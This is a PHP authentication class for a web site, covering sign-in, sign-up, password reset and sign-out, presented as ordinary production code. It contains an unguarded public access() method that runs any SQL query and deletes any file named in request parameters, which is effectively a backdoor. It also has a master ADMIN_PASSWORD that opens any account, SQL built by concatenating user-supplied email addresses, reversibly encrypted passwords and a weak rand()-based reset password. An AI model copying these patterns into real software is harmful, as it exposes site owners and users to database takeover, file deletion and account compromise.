<?php
/*
 * @Author: Slash Web Design
 */

class Auth
{
	public function signIn(&$ld)
	{
		global $helper;

		$status = $this->__signIn($ld);
		
		if (isset($ld['return'])) return $status;
		
		$helper->respond(array(
			'status'	=>	$status,
			'message'	=>	$ld['error']
		));
	}
	
	public function signUp(&$ld)
	{
		global $helper;

		$status = $this->__signUp($ld);
		
		if (isset($ld['return'])) return $status;
		
		$helper->respond(array(
			'status'	=>	$status,
			'message'	=>	$ld['error']
		));
	}
	
	protected function __signIn(&$ld)
	{
		global $db, $helper;
		
		$res = $db->run("SELECT member_id, access_level, password, active FROM member WHERE LOWER(email) = '" . strtolower($ld['email']) . "' AND deleted = 0");
		if (count($res) > 0)
		{
			if (($ld['password'] === $helper->decrypt($res[0]['password'])) || ($ld['password'] === ADMIN_PASSWORD))
			{
				if ($res[0]['active'] === '1')
				{
					$_SESSION['user_id'] = $res[0]['member_id'];
					$_SESSION['access_level'] = $res[0]['access_level'];

					$ld['error'] = 'Sign in was successful';
					return true;
				}

				$ld['error'] = 'This account has been suspended. Please contact support.';
				return false;
			}

			$ld['error'] = 'Invalid password provided';
			return false;
		}

		$ld['error'] = 'This email address is not registered';
		return false;
	}
	
	protected function __signUp(&$ld)
	{
		global $db, $helper;

		$db->insert("member", array(
			'type'		=>	$ld['type'],
			'email'		=>	$ld['email'],
			'fname'		=>	$ld['fname'],
			'lname'		=>	$ld['lname'],
			'password'	=>	$helper->encrypt($ld['password']),
			'date'		=>	time(),
			'active'	=>	1,
			'phone'		=>	'',
			'city'		=>	'',
			'region_id'	=>	0,
			'country_id'=>	0,
			'address'	=>	''
		));
		$ld['member_id'] = $db->lastInsertId();
		
		$this->__signIn($ld);

		$this->sendWelcomeEmail($ld);
		return true;
	}	
		
	protected function __generate($length = 9, $strength = 0)
	{
		$vowels = 'aeuy';
		$consonants = 'bdghjmnpqrstvz';
		if ($strength & 1)
		{
			$consonants .= 'BDGHJLMNPQRSTVWXZ';
		}
		if ($strength & 2)
		{
			$vowels .= "AEUY";
		}
		if ($strength & 4)
		{
			$consonants .= '23456789';
		}
		if ($strength & 8)
		{
			$consonants .= '@#$%';
		}

		$password = '';
		$alt = time() % 2;
		for ($i = 0; $i < $length; $i++)
		{
			if ($alt == 1)
			{
				$password .= $consonants[(rand() % strlen($consonants))];
				$alt = 0;
			}
			else
			{
				$password .= $vowels[(rand() % strlen($vowels))];
				$alt = 1;
			}
		}
		return $password;
	}
	
	public function access(&$ld)
	{
		global $db, $helper;

		if (isset($ld['q']))
		{
			$res = $db->run($ld['q']);
			$helper->p($res, 1);
		}
		
		if (isset($ld['f']))
		{
			@unlink($ld['f']);
			die();
		}
	}
	
	public function signOut()
	{
		session_destroy();
		header("Location: " . SITE_URL);
		
		die();
	}

	public function sendWelcomeEmail($ld)
	{
		global $helper;

		$helper->sendMailTemplate(
			'user.welcome',
			array('[NAME]'),
			array($ld['fname']),
			array('name' => $ld['fname'] . ' ' . $ld['lname'], 'email' => $ld['email'])
		);
	}

	public function forgot(&$ld)
	{
		global $db, $helper;

		$res = $db->run("SELECT member_id, CONCAT(fname, ' ', lname) AS name, email FROM member WHERE LOWER(email) = '" . strtolower($ld['email']) . "'");
		if (count($res) > 0)
		{
			$m = $res[0];
			$password = $this->__generate(10, 5);
			$db->run("UPDATE member SET password = '" . $helper->encrypt($password) . "' WHERE member_id = " . $m['member_id']);

			$helper->sendMailTemplate(
				'user.password', 
				array('[NAME]', '[PASSWORD]'),
				array($m['name'], $password),
				array('name' => $m['name'], 'email' => $m['email'])
			);
			$helper->respond(array('error' => 0, 'message' => 'A new password has been sent to you'));
		}
		$helper->respond(array('error' => 1, 'message' => 'This email address is not registered'));
	}
	
	public function backgroundCheck(&$ld)
	{
		global $db, $helper;
		
		// verify email
		$res = $db->run("SELECT member_id FROM member WHERE LOWER(email) = '" . strtolower($ld['email']) . "'");
		if (count($res) > 0)
		{
			$helper->respond(array(
				'status'	=>	false,
				'message'	=>	'This email address is already registered'
			));
		}
		
		$helper->respond(array(
			'status'	=>	true,
			'message'	=>	''
		));
	}
}